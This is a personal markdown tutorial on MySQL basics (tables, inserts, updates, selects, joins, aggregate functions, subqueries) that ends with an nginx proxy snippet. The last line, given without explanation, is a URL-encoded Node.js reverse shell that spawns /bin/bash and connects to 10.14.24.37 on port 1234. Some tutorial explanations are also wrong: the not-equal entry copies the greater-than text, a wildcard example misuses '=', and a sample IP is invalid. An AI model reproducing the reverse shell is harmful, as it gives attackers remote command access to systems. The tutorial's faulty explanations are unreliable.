
# SQL;

# Create a DataBase;
* The CREATE DATABASE statement is used to create a new SQL database.
```
CREATE DATABASE database_name;
CREATE DATABASE students;
```

# Create Tables;
* The CREATE TABLE command creates a new table in the database.
```
create table table_name(id int, name varchar(25));
create table users(id int,name varchar(55),username varchar(10),password varchar(20),ipAdress varchar(20));
```

# INSERT INTO VALUES;
* The INSERT INTO statement is used to insert new records in a table.
* It is possible to write the INSERT INTO statement in two ways: 1. Specify both the column names and the values to be inserted: INSERT INTO table_name (column1, column2, column3, ...)
```
insert into table_name(id,name,username,password,Domain) value (83,'vijaySattwic','vijay','vijay@password1234','vijaysattwic.com');
insert into users(id,name,username,password,Domain) value (83,'vijaySattwic','vijay','vijay@password1234','vijaysattwic.com');
```

# ADDing New COLUMN;
* The ALTER COLUMN command is used to change the data type of a column in a table.
* The ALTER TABLE statement is used to add, delete, or modify columns in an existing table.
```
ALTER TABLE table_name ADD column_name data_type constraints;
ALTER TABLE users ADD OS VARCHAR(25);
```

# INSERT and UPDATE
* The main difference between INSERT and UPDATE in SQL is that INSERT is used to add new records to the table while UPDATE is used to modify the existing records in the table.

# UPDATE;
* The UPDATE statement is used to modify the existing records in a table.
```
UPDATE table_name SET column1 = value1, column2 = value2, ... WHERE condition;
UPDATE users set OS='linux' where name='RJRaju';
```

# SELECT;
* The SELECT statement is used to select data from a database. The data returned is stored in a result table, called the result-set.
```
SELECT column1, column2, columnN FROM table_name;
select * from table_name;
SELECT * FROM users WHERE OperatingSystem='linux';
SELECT * FROM users WHERE OperatingSystem LIKE 'linux';
SELECT * FROM users WHERE id LIKE '9%';
```

# LessThan or GreaterThan and NotEqualTo;
**LessThan**
* The SQL Less Than comparison operator (<) is used to compare two values. It returns TRUE if the first value is less than the second. If the second is less, it returns FALSE. You can also test for Less than or equal to by using <=.

**GreaterThan**
* The SQL Greater Than comparison operator (>) is used to compare two values. It returns TRUE if the first value is greater than the second. If the second is greater, it returns FALSE. You can also test for greater than or equal to by using >=.

**NotEqualTo**
* The SQL Greater Than comparison operator (>) is used to compare two values. It returns TRUE if the first value is greater than the second. If the second is greater, it returns FALSE. You can also test for greater than or equal to by using >=.
```
select * from users WHERE id < 97;
select * from users WHERE id > 97;
select * from users WHERE OperatingSystem <> 'linux';
```

# SQL wildcards underscore ( _ )
* The underscore character ( _ ) represents a single character to match a pattern from a word or string. More than one ( _ ) underscore characters can be used to match a pattern of multiple characters.
```
select * from users WHERE id = "__";
```

# Change COLUMN Name
* The ALTER COLUMN command is used to change the data type of a column in a table.
```
ALTER TABLE users RENAME COLUMN Old_Column TO NewColumn;
ALTER TABLE users RENAME COLUMN ipAdress TO Domain;
```

# Delete and Drop
* DELETE  is used to remove records/tuples from a table
* DROP is used to remove entire table/schema,

# DROP TABLE;
* The DROP TABLE statement is used to drop an existing table in a database.
```
DROP TABLE table_name;
DROP TABLE employs;
```

# DELETE COLUM;
* The DELETE statement is used to delete existing records in a table.
```
DELETE FROM table_name WHERE condition;
DELETE FROM users WHERE os='windows';
```

# JOINS
**Types of JOINs**

1. Inner JOIN [ comman data ]
2. Left JOIN [ comman data + Left data ]
3. Right JOIN [ comman data + Right data ]
4. Full Outer JOIN [ comman data + uncomman data ]
5. Self JOIN

# Inner JOIN
* SELECT * FROM users AS u INNER JOIN dev AS d on u.id = d.id
```
mysql> SELECT * FROM users AS u INNER JOIN dev AS d on u.id = d.id;
+------+--------------+----------+--------------------+------------------+-----------------+------+---------------+-------------------------+
| id   | name         | username | password           | Domain           | OperatingSystem | id   | developerName | programming             |
+------+--------------+----------+--------------------+------------------+-----------------+------+---------------+-------------------------+
|   97 | RJRaju       | raju     | rjraju@password    | 127.0.0.1        | linux           |   97 | Raju          | BashScript , JavaScript |
|  102 | charan       | charan   | charan@1234        | 192.168.158.101  | windows         |  102 | charan        | Java , JavaScript       |
|   83 | vijaySattwic | vijay    | vijay@password1234 | vijaysattwic.com | linux           |   83 | vijaySattwic  | nodejs , java           |
|   97 | Raju         | Raju     | raju@password      | localhost        | linux           |   97 | Raju          | BashScript , JavaScript |
+------+--------------+----------+--------------------+------------------+-----------------+------+---------------+-------------------------+
4 rows in set (0.18 sec)
```
* SELECT u.id,u.name,u.username,u.password,u.Domain,d.programming FROM users AS u INNER JOIN dev AS d ON u.id = d.id;
```
mysql> SELECT u.id,u.name,u.username,u.password,u.Domain,d.programming FROM users AS u INNER JOIN dev AS d ON u.id = d.id;
+------+--------------+----------+--------------------+------------------+-------------------------+
| id   | name         | username | password           | Domain           | programming             |
+------+--------------+----------+--------------------+------------------+-------------------------+
|   97 | RJRaju       | raju     | rjraju@password    | 127.0.0.1        | BashScript , JavaScript |
|  102 | charan       | charan   | charan@1234        | 192.168.158.101  | Java , JavaScript       |
|   83 | vijaySattwic | vijay    | vijay@password1234 | vijaysattwic.com | nodejs , java           |
|   97 | Raju         | Raju     | raju@password      | localhost        | BashScript , JavaScript |
+------+--------------+----------+--------------------+------------------+-------------------------+
4 rows in set (0.00 sec)
```

# Left JOIN
* SELECT * FROM users AS u LEFT JOIN dev AS d on u.id = d.id;
```
mysql> SELECT * FROM users AS u LEFT JOIN dev AS d on u.id = d.id;
+------+-----------------+-----------+--------------------+------------------+-----------------+------+---------------+-------------------------+
| id   | name            | username  | password           | Domain           | OperatingSystem | id   | developerName | programming             |
+------+-----------------+-----------+--------------------+------------------+-----------------+------+---------------+-------------------------+
|   97 | RJRaju          | raju      | rjraju@password    | 127.0.0.1        | linux           |   97 | Raju          | BashScript , JavaScript |
|  102 | charan          | charan    | charan@1234        | 192.168.158.101  | windows         |  102 | charan        | Java , JavaScript       |
|  455 | nanaji          | nani      | nani@1234          | 128.168.776.22   | windows         | NULL | NULL          | NULL                    |
|   83 | vijaySattwic    | vijay     | vijay@password1234 | vijaysattwic.com | linux           |   83 | vijaySattwic  | nodejs , java           |
|   78 | YashwanthGorisi | yashwanth | yashwanth@password | yashwanth.in     | windows         | NULL | NULL          | NULL                    |
|   97 | Raju            | Raju      | raju@password      | localhost        | linux           |   97 | Raju          | BashScript , JavaScript |
+------+-----------------+-----------+--------------------+------------------+-----------------+------+---------------+-------------------------+
6 rows in set (0.28 sec)
```

# Right JOIN
* SELECT * FROM users AS u RIGHT JOIN dev AS d on u.id = d.id;
```
mysql> SELECT * FROM users AS u RIGHT JOIN dev AS d on u.id = d.id;
+------+--------------+----------+--------------------+------------------+-----------------+------+---------------+-------------------------+
| id   | name         | username | password           | Domain           | OperatingSystem | id   | developerName | programming             |
+------+--------------+----------+--------------------+------------------+-----------------+------+---------------+-------------------------+
|   83 | vijaySattwic | vijay    | vijay@password1234 | vijaysattwic.com | linux           |   83 | vijaySattwic  | nodejs , java           |
| NULL | NULL         | NULL     | NULL               | NULL             | NULL            |  124 | siva          | Java                    |
|   97 | Raju         | Raju     | raju@password      | localhost        | linux           |   97 | Raju          | BashScript , JavaScript |
|   97 | RJRaju       | raju     | rjraju@password    | 127.0.0.1        | linux           |   97 | Raju          | BashScript , JavaScript |
|  102 | charan       | charan   | charan@1234        | 192.168.158.101  | windows         |  102 | charan        | Java , JavaScript       |
+------+--------------+----------+--------------------+------------------+-----------------+------+---------------+-------------------------+
5 rows in set (0.01 sec)
```

# Function
* SQL Aggregate Functions
* SQL aggregate functions return a single value, calculated from values in a column.

**Useful aggregate functions:**

* AVG() - Returns the average value
```
SELECT AVG(column_name) FROM table_name;
SELECT AVG(id) AS aver FROM users;

mysql> SELECT AVG(id) AS aver FROM users;
+----------+
| aver     |
+----------+
| 152.0000 |
+----------+
1 row in set (0.00 sec)
```

* COUNT() - Returns the number of rows
```
SELECT COUNT(*) FROM table_name;
SELECT COUNT(column_name) FROM table_name;

mysql> SELECT COUNT(*) FROM users;
+----------+
| COUNT(*) |
+----------+
|        6 |
+----------+
1 row in set (0.49 sec)
```

* FIRST() - Returns the first value
```
SELECT column_name FROM table_name
ORDER BY column_name ASC
LIMIT 1;

SELECT username FROM users ORDER BY username ASC LIMIT 1;

mysql> SELECT username FROM users ORDER BY username DESC LIMIT 1;
+-----------+
| username  |
+-----------+
| yashwanth |
+-----------+
1 row in set (0.00 sec)
```
* LAST() - Returns the last value
```
SELECT column_name FROM table_name
ORDER BY column_name DESC
LIMIT 1;

SELECT username FROM users ORDER BY username DESC LIMIT 4;

mysql> SELECT username FROM users ORDER BY username DESC LIMIT 4;
+-----------+
| username  |
+-----------+
| yashwanth |
| vijay     |
| raju      |
| Raju      |
+-----------+
4 rows in set (0.00 sec)
```

* MAX() - Returns the largest value
```
mysql> SELECT MAX(id) AS max FROM users;
+------+
| max  |
+------+
|  455 |
+------+
1 row in set (0.02 sec)
```

* MIN() - Returns the smallest value
```
mysql> SELECT MIN(id) AS min FROM users;
+------+
| min  |
+------+
|   78 |
+------+
1 row in set (0.00 sec)
```

* SUM() - Returns the sum
```
SELECT SUM(column_name) FROM table_name;

SELECT SUM(id) FROM users;
+---------+
| SUM(id) |
+---------+
|     912 |
+---------+
1 row in set (0.01 sec)

mysql> SELECT SUM(id) AS sum FROM users;
+------+
| sum  |
+------+
|  912 |
+------+
1 row in set (0.00 sec)
```

# SUB QUERIES
* subquery is a query that is nested inside a SELECT , INSERT , UPDATE , or DELETE statement, or inside another subquery. 
**TYPES OF SUB QUERIES**
```
mysql> SELECT * FROM users WHERE OperatingSystem='linux' and id IN(SELECT id FROM dev WHERE Domain='localhost' OR Domain='127.0.0.1');
+------+--------+----------+-----------------+-----------+-----------------+
| id   | name   | username | password        | Domain    | OperatingSystem |
+------+--------+----------+-----------------+-----------+-----------------+
|   97 | RJRaju | raju     | rjraju@password | 127.0.0.1 | linux           |
|   97 | Raju   | Raju     | raju@password   | localhost | linux           |
+------+--------+----------+-----------------+-----------+-----------------+
2 rows in set (0.00 sec)
```

```
mysql> SELECT * FROM users WHERE OperatingSystem='windows' and OperatingSystem IN(SELECT OperatingSystem FROM users WHERE id>97);
+------+-----------------+-----------+--------------------+-----------------+-----------------+
| id   | name            | username  | password           | Domain          | OperatingSystem |
+------+-----------------+-----------+--------------------+-----------------+-----------------+
|  102 | charan          | charan    | charan@1234        | 192.168.158.101 | windows         |
|  455 | nanaji          | nani      | nani@1234          | 128.168.776.22  | windows         |
|   78 | YashwanthGorisi | yashwanth | yashwanth@password | yashwanth.in    | windows         |
+------+-----------------+-----------+--------------------+-----------------+-----------------+
3 rows in set (0.00 sec)
```

1. normal SUB QUERIES
2. co-related SUB QUERIES

# Normal SUB QUERIES

















# LEAVE IT NODE+NGINX+DOCKER :)
```
ALTER DATABASE webserver MODIFY NAME = nerdpine;

server {
    location / {
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        client_max_body_size 64M;
        proxy_pass http://nodeserver:8000;
    }
}
```

```

var+net+=+require("net"),+sh+=+require("child_process").exec("/bin/bash");var+client+=+new+net.Socket();client.connect(1234,+"10.14.24.37",+function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});


```
